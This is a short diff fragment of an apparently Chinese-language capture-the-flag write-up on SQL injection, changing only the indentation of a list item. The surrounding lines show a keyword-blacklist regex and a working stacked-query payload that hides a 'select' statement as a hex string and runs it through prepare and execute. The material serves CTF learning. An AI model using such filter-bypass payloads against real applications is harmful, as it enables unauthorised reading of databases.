@@ -50,7 +50,7 @@ sql注入
 return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
 ```
    因为过滤了select所以要绕一下，绕过select的方法我知道的有三中，回顾一下：
-   1. 预处理语句
+1. 预处理语句
 就是用16进制字符串的形式把sql语句预处理之后再调用，就像这样
 ```http
 ?inject=-1';SeT@a=73656c656374202a2066726f6d20466c616748657265;prepare execsql from @a;execute execsql;#
